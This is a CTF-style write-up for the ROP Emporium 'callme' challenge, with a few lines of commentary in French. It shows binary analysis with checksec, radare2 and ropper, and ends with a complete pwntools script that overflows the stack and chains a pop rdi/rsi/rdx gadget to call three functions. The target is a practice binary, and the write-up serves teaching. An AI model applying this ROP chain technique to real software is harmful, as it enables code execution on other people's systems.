# 03: Callme 


https://ropemporium.com/binary/callme.zip


## callme 

```
$ ./callme
callme by ROP Emporium
x86_64

Hope you read the instructions...

> 
Thank you!

Exiting
```



##  checksec


```
$ checksec callme
[*] '/home/yolo/yolo/BufferOverflows/ropemporium/03_callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

## functions 

```
$ r2 callme
[0x00400760]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x00400760]> afl
0x00400760    1 42           entry0
0x004006a8    3 23           sym._init
0x004009b4    1 9            sym._fini
0x004007a0    4 42   -> 37   sym.deregister_tm_clones
0x004007d0    4 58   -> 55   sym.register_tm_clones
0x00400810    3 34   -> 29   entry.fini0
0x00400840    1 7            entry.init0
0x00400898    1 90           sym.pwnme
0x00400700    1 6            sym.imp.memset
0x004006d0    1 6            sym.imp.puts
0x004006e0    1 6            sym.imp.printf
0x00400710    1 6            sym.imp.read
0x004008f2    1 74           sym.usefulFunction
0x004006f0    1 6            sym.imp.callme_three
0x00400740    1 6            sym.imp.callme_two
0x00400720    1 6            sym.imp.callme_one
0x00400750    1 6            sym.imp.exit
0x004009b0    1 2            sym.__libc_csu_fini
0x00400940    4 101          sym.__libc_csu_init
0x00400790    1 2            sym._dl_relocate_static_pie
0x00400847    1 81           main
0x00400730    1 6            sym.imp.setvbuf
[0x00400760]> 
```

## x64 calling convention 

 
+---------+------+------+------+------+------+------+
| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
+---------+------+------+------+------+------+------+
|   %rax  | %rdi | %rsi | %rdx | %r10 | %r8  | %r9  |
+---------+------+------+------+------+------+------+

En x64 les arguments sont passés via les registres.
Il faut un gadget "pop rdi, pop rsi, pop rdx, ret"
Ou des gadgets "pop rdi,ret" "pop rsi, ret" "pop rdx, ret"

Notre payload va être: 'A'*offset_padding   + pop_rdi_rsi_rdx_gadget + arg0, arg1, arg2 + fct1
                                            + pop_rdi_rsi_rdx_gadget + arg0, arg1, arg2 + fct2
                                            + pop_rdi_rsi_rdx_gadget + arg0, arg1, arg2 + fct3



## Trouver le gadget pop rdi, ret

```
$ ropper -f callme | grep rdi
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x0000000000400884: add byte ptr [rax], al; add byte ptr [rdi + 0x4009e7], bh; call 0x6d0; mov eax, 0; pop rbp; ret; 
0x0000000000400935: add byte ptr [rax], al; call 0x750; pop rdi; pop rsi; pop rdx; ret; 
0x0000000000400886: add byte ptr [rdi + 0x4009e7], bh; call 0x6d0; mov eax, 0; pop rbp; ret; 
0x0000000000400937: call 0x750; pop rdi; pop rsi; pop rdx; ret; 
0x000000000040093b: lcall [rdi + 0x5e]; pop rdx; ret; 
0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; 
0x00000000004009a3: pop rdi; ret; 
```

pop_rdi_rsi_rdx_gadget = 0x000000000040093c



## exploit python3 + pwn

```
#!/usr/bin/python3 


from pwn import *

elf = context.binary = ELF('callme')
info("%#x callme_one", elf.symbols.callme_one)
callme_one = p64(elf.symbols.callme_one)
callme_two = p64(elf.symbols.callme_two)
callme_three = p64(elf.symbols.callme_three)

io = process(elf.path)

offset_padding = 40
arg1    = p64(0xdeadbeefdeadbeef) 
arg2    = p64(0xcafebabecafebabe)
arg3    = p64(0xd00df00dd00df00d)
pop_rdi_rsi_rdx_gadget = p64(0x000000000040093c)

payload = b'A'*offset_padding + pop_rdi_rsi_rdx_gadget + arg1 + arg2 + arg3 + callme_one \
                              + pop_rdi_rsi_rdx_gadget + arg1 + arg2 + arg3 + callme_two \
                              + pop_rdi_rsi_rdx_gadget + arg1 + arg2 + arg3 + callme_three

io.sendline(payload)
io.interactive()
while 1:
    try:
        print(io.recvline().decode())
    except:
        exit()
```